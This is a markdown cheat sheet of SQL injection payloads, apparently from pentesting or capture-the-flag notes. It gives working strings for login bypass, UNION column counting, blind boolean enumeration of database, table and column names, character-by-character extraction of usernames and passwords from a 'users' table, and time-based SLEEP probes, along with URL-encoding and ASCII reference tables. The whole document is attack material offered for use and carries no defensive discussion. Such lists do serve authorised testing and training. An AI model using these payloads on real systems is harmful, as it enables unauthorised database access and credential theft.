# SQL Injection Payloads

## Basic
```sql
1' OR 1=1--+
1' OR '1'='1
admin'--+
```

## Column count
```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' UNION SELECT NULL--+
1' UNION SELECT NULL,NULL--+
```

## Database enumeration
```sql
-- Database name length
1' AND LENGTH(database())=4--+

-- Database name characters
1' AND ASCII(SUBSTRING(database(),1,1))=100--+

-- Binary search
1' AND ASCII(SUBSTRING(database(),1,1))>109--+
```

## Table enumeration
```sql
1' AND (SELECT COUNT(table_name) FROM
information_schema.tables WHERE
table_schema=database())=2--+

1' AND ASCII(SUBSTRING((SELECT table_name FROM
information_schema.tables WHERE
table_schema=database() LIMIT 0,1),1,1))=97--+
```

## Column enumeration
```sql
1' AND (SELECT COUNT(column_name) FROM
information_schema.columns WHERE
table_name='users')=8--+

1' AND ASCII(SUBSTRING((SELECT column_name FROM
information_schema.columns WHERE
table_name='users' LIMIT 0,1),1,1))=97--+
```

## Data extraction
```sql
1' AND ASCII(SUBSTRING((SELECT user FROM
users LIMIT 0,1),1,1))=97--+

1' AND ASCII(SUBSTRING((SELECT password FROM
users LIMIT 0,1),1,1))=97--+
```

## Time based
```sql
1' AND SLEEP(5)--+
1' AND IF(1=1,SLEEP(5),0)--+
```

## URL encoding reference
| Character | Encoded | Double Encoded |
|---|---|---|
| `.` | `%2e` | `%252e` |
| `/` | `%2f` | `%252f` |
| `'` | `%27` | `%2527` |
| `#` | `%23` | `%2523` |
| ` ` | `%20` | `%2520` |

## ASCII quick reference
| Char | ASCII | Char | ASCII |
|---|---|---|---|
| a | 97 | A | 65 |
| d | 100 | D | 68 |
| m | 109 | M | 77 |
| s | 115 | S | 83 |
| u | 117 | U | 85 |
| z | 122 | Z | 90 |
| 0 | 48 | 9 | 57 |